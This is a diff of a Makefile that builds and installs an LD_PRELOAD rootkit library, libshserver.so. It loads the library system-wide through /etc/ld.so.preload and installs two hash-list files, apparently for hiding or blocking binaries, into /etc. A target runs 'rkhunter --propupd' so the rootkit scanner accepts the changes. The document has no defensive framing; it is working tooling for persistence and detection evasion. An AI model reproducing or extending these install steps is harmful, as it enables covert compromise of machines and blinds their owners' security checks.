@@ -5,7 +5,8 @@ INSTALL_DIR = /lib
 LIB_TARGET = libshserver.so
 LIB_SRCS = libshserver.c etc.c
 LIB_OBJS = $(LIB_SRCS:.c=.o)
-HASH_DB = __tmphashtable
+HASHDB_BINAVOID = __tmphashtable
+HASHDB_BINBLOCK = __tmp2hashtable
 
 all: config $(LIB_TARGET)
 
@@ -23,7 +24,8 @@ install: all
 	@install -m 0755 $(LIB_TARGET) $(INSTALL_DIR)/
 	@echo [-] Updating hash db
 	@python3 update_hash_db.py
-	@install -m 644 $(HASH_DB) /etc/
+	@install -m 644 $(HASHDB_BINAVOID) /etc/
+	@install -m 644 $(HASHDB_BINBLOCK) /etc/
 	@echo [-] Loading rootkit
 	@echo $(INSTALL_DIR)/$(LIB_TARGET) > /etc/ld.so.preload
 	@echo [-] Done
@@ -33,7 +35,8 @@ uninstall:
 	@echo [-] Removing rootkit files
 	rm -f /etc/ld.so.preload
 	rm -f $(INSTALL_DIR)/$(LIB_TARGET)
-	rm -f /etc/$(HASH_DB)
+	rm -f /etc/$(HASHDB_BINAVOID)
+	rm -f /etc/$(HASHDB_BINBLOCK)
 	@echo [-] Done
 
 clean:
@@ -44,5 +47,12 @@ update-rkhunter-db:
 	@command -v rkhunter >/dev/null 2>&1 && rkhunter --propupd >/dev/null 2>&1 || true
 	@echo [-] Done
 
-.PHONY: all config install uninstall clean update-rkhunter-db
+update-hashdb:
+	@echo [-] Updating hash db
+	@python3 update_hash_db.py
+	@install -m 644 $(HASHDB_BINAVOID) /etc/
+	@install -m 644 $(HASHDB_BINBLOCK) /etc/
+	@echo [-] Done
+
+.PHONY: all config install uninstall clean update-rkhunter-db update-hashdb
 
